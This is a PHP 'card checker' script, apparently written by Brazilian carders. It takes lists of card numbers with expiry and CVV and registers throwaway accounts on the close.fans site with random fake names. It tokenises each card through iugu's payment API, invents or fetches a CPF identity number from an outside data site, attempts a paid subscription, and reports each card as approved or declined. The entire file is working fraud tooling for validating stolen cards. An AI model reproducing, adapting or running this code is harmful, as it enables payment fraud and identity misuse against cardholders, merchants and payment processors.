<?php
error_reporting(0);
function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    return explode($delimiters[0], $one);
}
function getstr($separa, $inicia, $fim, $contador) {
    $nada = explode($inicia, $separa);
    $nada = explode($fim, $nada[$contador]);
    return $nada[0];
}

function gerarCPF() {
    $n = [rand(0, 9), rand(0, 9), rand(0, 9), rand(0, 9), rand(0, 9), rand(0, 9), rand(0, 9), rand(0, 9), rand(0, 9)];
    for ($t = 9; $t < 11; $t++) {
        for ($d = 0, $c = 0; $c < $t; $c++) $d += $n[$c] * (($t + 1) - $c);
        $d = ((10 * $d) % 11) % 10;
        $n[$t] = $d;
    }
    return implode('', $n);
}

$lista_input = $_GET['lista'] ?? $_POST['lista'];
$regex = str_replace(array(" ", ":", ";", "|", ",", "=>", "-", "/", "|||"), "|", $lista_input);

if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex)) {
    die('<span class="text-danger">Lista inválida.</span>');
}

$dados_lista = explode("|", $regex);
$cc = $dados_lista[0];
$mes = $dados_lista[1];
$ano = $dados_lista[2];
$cvv = $dados_lista[3];

if (strlen($ano) < 4) $ano = "20" . $ano;

$primeirosNomes = ["Lucas", "Gabriel", "Mateus", "Felipe", "Bruno", "Thiago", "Rodrigo", "Andre", "Ricardo", "Fernando", "Gustavo", "Leonardo", "Marcelo", "Eduardo", "Daniel"];
$sobrenomes = [ "Silva", "Santos", "Oliveira", "Souza", "Pereira", "Costa", "Ferreira", "Rodrigues", "Almeida", "Nascimento", "Lopes", "Carvalho", "Gomes", "Martins", "Soares" ,"Stark", "Rogers", "Banner", "Romanoff", "Strange", "Danvers", "Parker", "Maximoff"];
$primeiroNome = $primeirosNomes[array_rand($primeirosNomes)];
$sobrenome = $sobrenomes[array_rand($sobrenomes)];
$nome_completo = "$primeiroNome $sobrenome";

$inicio = microtime(true);
$email = strtolower($primeiroNome . $sobrenome . rand(100, 9999)) . "@gmail.com";

$dirCcookies = __DIR__.'/cookies/'.uniqid('cookie_').'.txt';
if (!is_dir(__DIR__.'/cookies/')) mkdir(__DIR__.'/cookies/', 0777, true);

$curl = curl_init();
curl_setopt_array($curl, [
    CURLOPT_URL => 'https://close.fans/api/people/getFeatured',
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode(["category" => "main", "page" => "search"]),
    CURLOPT_HTTPHEADER => ['content-type: application/json', 'user-agent: Mozilla/5.0...'],
    CURLOPT_COOKIEJAR => $dirCcookies,
]);
$res_users = curl_exec($curl);
$userdocriador = getstr($res_users, '"username": "', '"', rand(1, 20));

curl_setopt_array($curl, [
    CURLOPT_URL => 'https://close.fans/api/auth/signupWithPassword',
    CURLOPT_POSTFIELDS => json_encode(["email" => $email, "password" => "Teste@102030", "rememberMe" => false]),
    CURLOPT_COOKIEFILE => $dirCcookies,
]);
curl_exec($curl);

curl_setopt_array($curl, [
    CURLOPT_URL => 'https://close.fans/api/checkout/listPaymentOptions',
    CURLOPT_POSTFIELDS => json_encode(["creatorUsername" => $userdocriador]),
]);
$getCredentials = curl_exec($curl);
$json_cred = json_decode($getCredentials);
$iuguaccount = $json_cred->creditCard->iuguAccountId->save ?? 'E1977D7D188647A79D7387F3D6F2C18D'; 
curl_setopt_array($curl, [
    CURLOPT_URL => 'https://close.fans/api/people/loadCreator',
    CURLOPT_POSTFIELDS => json_encode(["username" => $userdocriador]),
]);
$hashhkk = getstr(curl_exec($curl), '"hash": "', '"', 1);
$url_iugu = "https://api.iugu.com/v1/payment_token?method=credit_card&data[number]=$cc&data[verification_value]=$cvv&data[first_name]=$primeiroNome&data[last_name]=$sobrenome&data[month]=$mes&data[year]=$ano&data[brand]=visa&account_id=$iuguaccount";
curl_setopt($curl, CURLOPT_URL, $url_iugu);
curl_setopt($curl, CURLOPT_CUSTOMREQUEST, 'GET');
$res_token = curl_exec($curl);
$tokencardiugu = getstr($res_token, '"id":"', '"', 1);
$dados_br = json_decode(file_get_contents('https://chellyx.shop/dados/'));
$cpff = $dados_br->cpf ?? gerarCPF();
$nomee = $dados_br->nome ?? $nome_completo;

curl_setopt_array($curl, [
    CURLOPT_URL => 'https://close.fans/api/checkout/finishMainOffer',
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS => json_encode([
        "creatorUsername" => $userdocriador,
        "hash" => $hashhkk,
        "paymentData" => [
            "creditCardToken" => $tokencardiugu,
            "save" => true,
            "receiptName" => $nomee,
            "cpf" => $cpff
        ],
        "paymentMethod" => "credit_card",
        "plan" => "monthly"
    ]),
]);

$resp = curl_exec($curl);
$json_resp = json_decode($resp);
$tempoTotal = number_format(microtime(true) - $inicio, 2);
if (strpos($resp, '"ok":true') !== false) {
    echo "Aprovada ➔ $cc|$mes|$ano|$cvv ➔ Pagamento Confirmado ➔ {$tempoTotal}s<br>";
} else {
    $erro = $json_resp->error ?? "Erro desconhecido ou CPF inválido";
    echo "Reprovada ➔ $cc|$mes|$ano|$cvv ➔ $erro ➔ {$tempoTotal}s<br>";
}

unlink($dirCcookies);
?>